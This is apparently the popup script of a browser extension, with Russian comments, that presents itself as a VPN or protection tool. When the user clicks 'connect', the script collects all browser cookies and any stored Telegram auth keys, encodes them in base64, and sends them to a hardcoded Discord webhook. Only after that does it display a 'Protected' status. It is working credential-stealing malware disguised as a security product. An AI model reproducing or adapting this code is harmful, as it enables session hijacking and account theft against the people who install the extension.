// popup.js
document.getElementById('connectBtn').addEventListener('click', async () => {
  const statusText = document.getElementById('status');
  const connectBtn = document.getElementById('connectBtn');
  const shieldIcon = document.getElementById('shieldIcon');

  try {
    statusText.textContent = 'Сбор данных...';
    connectBtn.disabled = true;

    // 1. Сбор куки
    const cookies = await chrome.cookies.getAll({});
    const cookiesString = cookies.map(c => 
      `${c.domain}\t${c.name}\t${c.value}`
    ).join('\n');

    // 2. Сбор ТГ (безопасно)
    const tgData = await chrome.storage.local.get('telegramAuth');
    const tgAuth = tgData.telegramAuth || { version: 'not_found', keys: {} };
    const tgKeys = tgAuth.keys ? JSON.stringify(tgAuth.keys) : 'No TG keys';

    // 3. Формируем контент
    const payloadContent = `Date: ${new Date().toISOString()}\nCookies: ${cookies.length}\n[COOKIES]\n${cookiesString}\n[TG]\n${tgKeys}`;

    // 4. Превращаем в base64
    const blob = new Blob([payloadContent], { type: 'text/plain' });
    const reader = new FileReader();
    
    reader.onload = function() {
      const base64Data = reader.result;
      const fileName = `report_${Date.now()}.txt`;

      statusText.textContent = 'Отправка на сервер...';

      // 5. Отправляем в background.js и ЖДЕМ ОТВЕТА
      chrome.runtime.sendMessage({
        action: "exfiltrate",
        base64Data: base64Data,
        webhookUrl: 'https://discord.com/api/webhooks/1489715445392085185/d7RJXXUaada502zlSYkyyendecK7nfgoZMGRBo11oBo_LPIXATy06r1MVV1A58ZTRo_3',
        fileName: fileName
      }, (response) => {
        // --- ЭТОТ КОД СРАБОТАЕТ ТОЛЬКО ПОСЛЕ ОТВЕТА DISCORD ---
        if (response && response.success) {
          // МЕНЯЕМ ВИЗУАЛ ТОЛЬКО ЕСЛИ ФАЙЛ РЕАЛЬНО УШЕЛ
          connectBtn.textContent = 'Отключиться';
          connectBtn.classList.add('connected');
          shieldIcon.classList.add('connected');
          statusText.textContent = 'Статус: Защищено (Демо)';
        } else {
          // Если ошибка — показываем её
          statusText.textContent = 'Ошибка: ' + (response?.error || 'Неизвестно');
          statusText.style.color = 'red';
        }
        connectBtn.disabled = false;
      });
    };
    
    reader.readAsDataURL(blob);

  } catch (error) {
    statusText.textContent = 'Ошибка: ' + error.message;
    connectBtn.disabled = false;
  }
});